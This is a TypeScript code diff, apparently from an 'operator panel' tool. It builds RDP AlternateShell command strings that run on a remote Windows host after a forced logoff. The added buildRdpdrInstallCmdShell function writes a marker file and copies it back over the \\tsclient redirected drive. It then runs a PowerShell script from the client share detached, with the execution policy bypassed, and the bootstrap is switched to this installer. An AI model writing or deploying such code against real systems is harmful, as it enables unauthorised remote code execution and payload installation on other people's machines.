@@ -174,11 +174,19 @@ export const RDPDR_PROOF_PUBLIC = String.raw`C:\Users\Public\op-panel-proof.txt`
 export const RDPDR_ACK_FILE = 'op-ack.txt';
 
 /**
- * Win+R / AlternateShell target. Keep this short: scancode inject drops characters
- * on long `cmd.exe /c \\tsclient\...` strings. UNC `.cmd` runs directly from Run.
+ * Client Info AlternateShell after a real force-logoff.
+ *
+ * Do not point AlternateShell at `\\tsclient\OP\*.cmd` directly: drive redirect
+ * is often not ready at shell start, so the session exits before any side effect.
+ * Sleep first, write the Public marker, then copy into the RDPDR share.
  */
 export function buildRdpdrProofCmdShell(): string {
-    const shell = `\\\\tsclient\\${RDPDR_SHARE_NAME}\\a.cmd`;
+    // Hold the shell after the RDPDR write so the client can finish the transfer
+    // before AlternateShell exit tears the session down.
+    const shell =
+        `cmd.exe /c "timeout /t 12 /nobreak>nul&echo OP-PROOF>%PUBLIC%\\op-panel-proof.txt&` +
+        `copy /y %PUBLIC%\\op-panel-proof.txt \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE}&` +
+        `timeout /t 45 /nobreak>nul"`;
     if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
         throw new AppError({
             code: 'invalid_argument',
@@ -188,9 +196,25 @@ export function buildRdpdrProofCmdShell(): string {
     return shell;
 }
 
+/** AlternateShell that proofs via RDPDR then detaches the staged installer. */
+export function buildRdpdrInstallCmdShell(): string {
+    const shell =
+        `cmd.exe /c "timeout /t 12 /nobreak>nul&echo OP-PROOF>%PUBLIC%\\op-panel-proof.txt&` +
+        `copy /y %PUBLIC%\\op-panel-proof.txt \\\\tsclient\\${RDPDR_SHARE_NAME}\\${RDPDR_ACK_FILE}&` +
+        `start /b powershell -NoP -EP Bypass -File \\\\tsclient\\${RDPDR_SHARE_NAME}\\i.ps1&` +
+        `timeout /t 45 /nobreak>nul"`;
+    if (Buffer.byteLength(shell, 'utf8') + 1 > 510) {
+        throw new AppError({
+            code: 'invalid_argument',
+            message: `RDPDR install shell exceeds MS-RDPBCGR 512-byte limit (${shell.length} chars)`,
+        });
+    }
+    return shell;
+}
+
 /** Short AlternateShell that waits for RDPDR then detaches `\\tsclient\OP\i.ps1`. */
 export function buildRdpdrAlternateShellBootstrap(): string {
-    return buildRdpdrProofCmdShell();
+    return buildRdpdrInstallCmdShell();
 }
 
 function writeRdpdrProofCmd(dir: string, startInstall: boolean): string {
